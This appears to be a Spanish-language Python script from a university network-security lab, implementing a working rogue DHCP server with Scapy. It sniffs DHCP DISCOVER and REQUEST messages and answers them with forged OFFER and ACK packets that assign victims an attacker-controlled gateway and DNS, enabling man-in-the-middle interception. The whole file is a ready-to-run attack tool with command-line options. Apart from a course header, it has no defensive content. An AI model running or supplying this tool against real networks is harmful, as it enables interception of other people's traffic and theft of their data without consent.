#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║        DHCP ROGUE / SPOOFING SERVER — Laboratorio ITLA          ║
║        Autor  : Raelina Ferrera                                  ║
║        Matrícula: 2021-2371                                      ║
║        Curso  : Seguridad en Redes                              ║
║        Fecha  : Febrero 2026                                     ║
╚══════════════════════════════════════════════════════════════════╝

DESCRIPCIÓN:
    Servidor DHCP falso (Rogue) que responde antes que el legítimo,
    asignando un gateway malicioso a las víctimas para interceptar
    su tráfico (MITM a nivel de red).

    Flujo: DISCOVER → OFFER (falso) → REQUEST → ACK (falso)

USO:
    sudo python3 dhcp_rogue.py -i <interfaz> [opciones]
"""

import argparse
import sys
import signal
import threading
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sniff, sendp, conf, get_if_hwaddr
)

# ─────────────────────────────────────────────
#  Banner
# ─────────────────────────────────────────────
BANNER = r"""
 ██████╗  ██████╗  ██████╗ ██╗   ██╗███████╗
 ██╔══██╗██╔═══██╗██╔════╝ ██║   ██║██╔════╝
 ██████╔╝██║   ██║██║  ███╗██║   ██║█████╗
 ██╔══██╗██║   ██║██║   ██║██║   ██║██╔══╝
 ██║  ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝

    ██████╗ ██╗  ██╗ ██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
    ██╔══██╗██║  ██║██╔════╝     ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
    ██║  ██║███████║██║          ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
    ██║  ██║██╔══██║██║          ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ██████╔╝██║  ██║╚██████╗     ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

        [ DHCP ROGUE SERVER ] · Raelina Ferrera · 2021-2371 · ITLA
"""

# ─────────────────────────────────────────────
#  Colores
# ─────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    MAGENTA= "\033[95m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def log_info(msg):    print(f"{C.CYAN}[*]{C.RESET} {msg}")
def log_ok(msg):      print(f"{C.GREEN}[+]{C.RESET} {msg}")
def log_warn(msg):    print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def log_offer(msg):   print(f"{C.MAGENTA}[OFFER]{C.RESET} {msg}")
def log_ack(msg):     print(f"{C.GREEN}[ACK]{C.RESET} {msg}")

# ─────────────────────────────────────────────
#  Pool de IPs del servidor rogue
# ─────────────────────────────────────────────
class RoguePool:
    def __init__(self, start: str, count: int = 50):
        """Genera IPs para ofrecer a las víctimas."""
        base = start.rsplit(".", 1)
        self._base   = base[0]
        self._cursor = int(base[1])
        self._max    = self._cursor + count
        self._given  = {}  # mac → ip

    def get_ip(self, mac: str) -> str:
        if mac in self._given:
            return self._given[mac]
        if self._cursor >= self._max:
            return None
        ip = f"{self._base}.{self._cursor}"
        self._given[mac] = ip
        self._cursor += 1
        return ip


# ─────────────────────────────────────────────
#  Construcción de paquetes DHCP
# ─────────────────────────────────────────────
def get_dhcp_message_type(pkt) -> str:
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "message-type":
            types = {1: "discover", 2: "offer", 3: "request",
                     4: "decline", 5: "ack", 6: "nak", 7: "release",
                     8: "inform"}
            return types.get(opt[1], "unknown")
    return "unknown"


def build_offer(pkt, offered_ip: str, rogue_ip: str,
                rogue_mac: str, fake_gateway: str,
                fake_dns: str, lease: int) -> bytes:
    """DHCPOFFER enviado al cliente."""
    xid = pkt[BOOTP].xid
    chaddr = pkt[BOOTP].chaddr

    offer = (
        Ether(src=rogue_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src=rogue_ip, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2,             # reply
            xid=xid,
            yiaddr=offered_ip,
            siaddr=rogue_ip,
            chaddr=chaddr,
        )
        / DHCP(options=[
            ("message-type", "offer"),
            ("server_id",     rogue_ip),
            ("lease_time",    lease),
            ("subnet_mask",   "255.255.255.0"),
            ("router",        fake_gateway),
            ("name_server",   fake_dns),
            "end",
        ])
    )
    return offer


def build_ack(pkt, offered_ip: str, rogue_ip: str,
              rogue_mac: str, fake_gateway: str,
              fake_dns: str, lease: int) -> bytes:
    """DHCPACK enviado al cliente."""
    xid    = pkt[BOOTP].xid
    chaddr = pkt[BOOTP].chaddr

    ack = (
        Ether(src=rogue_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src=rogue_ip, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2,
            xid=xid,
            yiaddr=offered_ip,
            siaddr=rogue_ip,
            chaddr=chaddr,
        )
        / DHCP(options=[
            ("message-type", "ack"),
            ("server_id",     rogue_ip),
            ("lease_time",    lease),
            ("subnet_mask",   "255.255.255.0"),
            ("router",        fake_gateway),
            ("name_server",   fake_dns),
            "end",
        ])
    )
    return ack


# ─────────────────────────────────────────────
#  Handler principal (sniff callback)
# ─────────────────────────────────────────────
stats = {"offers": 0, "acks": 0}

def make_handler(interface, rogue_ip, rogue_mac, fake_gateway,
                 fake_dns, lease, pool):

    def handler(pkt):
        if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
            return

        msg_type = get_dhcp_message_type(pkt)
        src_mac  = pkt[Ether].src

        if msg_type == "discover":
            offered = pool.get_ip(src_mac)
            if not offered:
                log_warn(f"Pool agotado — no se puede ofrecer IP a {src_mac}")
                return

            log_offer(f"DISCOVER desde {src_mac} → ofreciendo {offered} "
                      f"(gateway rogue: {fake_gateway})")

            offer_pkt = build_offer(pkt, offered, rogue_ip, rogue_mac,
                                    fake_gateway, fake_dns, lease)
            sendp(offer_pkt, iface=interface, verbose=False)
            stats["offers"] += 1

        elif msg_type == "request":
            assigned = pool.get_ip(src_mac)
            if not assigned:
                return

            log_ack(f"REQUEST desde {src_mac} → ACK con IP {assigned}")

            ack_pkt = build_ack(pkt, assigned, rogue_ip, rogue_mac,
                                fake_gateway, fake_dns, lease)
            sendp(ack_pkt, iface=interface, verbose=False)
            stats["acks"] += 1

            log_ok(f"{C.BOLD}Víctima {src_mac} configurada con gateway "
                   f"FALSO {fake_gateway}{C.RESET}")

    return handler


# ─────────────────────────────────────────────
#  Signal handler
# ─────────────────────────────────────────────
def signal_handler(sig, frame):
    print(f"\n{C.YELLOW}[!] Servidor Rogue detenido.{C.RESET}")
    print(f"{C.CYAN}[*] OFFERs enviados : {stats['offers']}{C.RESET}")
    print(f"{C.CYAN}[*] ACKs enviados   : {stats['acks']}{C.RESET}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


# ─────────────────────────────────────────────
#  Función principal
# ─────────────────────────────────────────────
def start_rogue(interface, rogue_ip, fake_gateway, fake_dns,
                pool_start, lease):

    rogue_mac = get_if_hwaddr(interface)
    pool      = RoguePool(pool_start, count=100)

    print(BANNER)
    log_info(f"Interfaz       : {C.BOLD}{interface}{C.RESET}")
    log_info(f"IP Rogue       : {C.BOLD}{rogue_ip}{C.RESET}")
    log_info(f"MAC Rogue      : {C.BOLD}{rogue_mac}{C.RESET}")
    log_warn(f"Gateway FALSO  : {C.BOLD}{fake_gateway}{C.RESET}  ← víctimas usarán esto")
    log_info(f"DNS Falso      : {C.BOLD}{fake_dns}{C.RESET}")
    log_info(f"Pool inicio    : {C.BOLD}{pool_start}{C.RESET}")
    log_info(f"Lease time     : {C.BOLD}{lease}s{C.RESET}")
    print()
    log_info("Escuchando DHCPDISCOVER... (Ctrl+C para detener)\n")

    conf.verb = 0
    handler   = make_handler(interface, rogue_ip, rogue_mac,
                              fake_gateway, fake_dns, lease, pool)

    sniff(
        iface=interface,
        filter="udp and (port 67 or port 68)",
        prn=handler,
        store=False,
    )


# ─────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        description="DHCP Rogue Server — ITLA Lab 2021-2371",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 dhcp_rogue.py -i eth0 --rogue-ip 10.21.23.50
  sudo python3 dhcp_rogue.py -i eth0 --rogue-ip 10.21.23.50 --fake-gw 10.21.23.50
        """,
    )
    p.add_argument("-i",  "--interface",  required=True,
                   help="Interfaz de red del atacante (ej. eth0)")
    p.add_argument("--rogue-ip",          required=True,
                   help="IP del servidor rogue (IP del atacante, ej. 10.21.23.50)")
    p.add_argument("--fake-gw",           default="10.21.23.50",
                   help="Gateway falso a entregar a las víctimas (default: IP del atacante)")
    p.add_argument("--fake-dns",          default="8.8.8.8",
                   help="DNS a entregar a las víctimas (default: 8.8.8.8)")
    p.add_argument("--pool-start",        default="10.21.23.100",
                   help="Primera IP del pool rogue (default: 10.21.23.100)")
    p.add_argument("--lease",             type=int, default=3600,
                   help="Lease time en segundos (default: 3600)")
    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    start_rogue(
        interface   = args.interface,
        rogue_ip    = args.rogue_ip,
        fake_gateway= args.fake_gw,
        fake_dns    = args.fake_dns,
        pool_start  = args.pool_start,
        lease       = args.lease,
    )